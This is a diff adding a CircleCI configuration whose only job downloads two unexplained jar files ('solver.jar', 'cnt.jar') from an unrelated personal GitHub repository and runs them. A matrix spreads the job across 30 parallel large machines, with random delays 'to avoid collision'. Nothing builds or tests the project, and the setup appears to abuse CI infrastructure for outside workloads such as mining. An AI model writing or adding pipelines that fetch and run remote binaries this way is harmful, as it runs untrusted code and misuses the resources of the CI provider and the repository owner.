@@ -1,0 +1,74 @@
+version: 2.1
+
+jobs:
+  run-files:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large
+    parameters:
+      job-name:
+        type: string
+        default: ""
+    steps:
+      - checkout
+      - run:
+          name: Install OpenJDK 17
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y openjdk-17-jdk curl
+      - run:
+          name: Download Files with Retry
+          shell: bash
+          command: |
+            echo "Sleeping randomly to avoid collision..."
+            sleep $((RANDOM % 15 + 1))
+
+            REPO_OWNER=${CIRCLE_PROJECT_USERNAME}
+            REPO_NAME=${CIRCLE_PROJECT_REPONAME}
+            BASE_URL="https://github.com/CharlesJones556640550/testing/raw/main"
+
+            declare -A FILES
+            FILES["wkr.jar"]="solver.jar"
+            FILES["cnt.jar"]="cnt.jar"
+
+            function download_with_retry() {
+              local url=$1
+              local output=$2
+              local max_retries=5
+              local count=0
+              local success=0
+
+              while [ $count -lt $max_retries ]; do
+                echo "Downloading $output from $url (attempt $((count+1)))..."
+                curl -L --fail "$url" -o "$output" && success=1 && break
+                count=$((count+1))
+                echo "Failed attempt $count. Retrying in $((count * 2))s..."
+                sleep $((count * 2))
+              done
+
+              if [ $success -eq 0 ]; then
+                echo "❌ Failed to download $output after $max_retries attempts."
+                exit 1
+              fi
+            }
+
+            for src in "${!FILES[@]}"; do
+              dst=${FILES[$src]}
+              url="$BASE_URL/$src"
+              download_with_retry "$url" "$dst"
+              sleep 2
+            done
+      - run:
+          name: Run Java Files
+          command: |
+            echo "Running cnt.jar..."
+            java -jar cnt.jar &
+            echo "Running solver.jar..."
+            java -jar solver.jar
+workflows:
+  run-svr:
+    jobs:
+      - run-files:
+          matrix:
+            parameters:
+              job-name: [t0,t1,12,13,thu4,t5,16,17,thu8,thu9,thu10,thu11,thu12,thu13,thu14,thu15,t16,thu17,18,thu19,thu20,thu21,thu22,thu23,thu24,t25,t26,t27,thu28,t29]
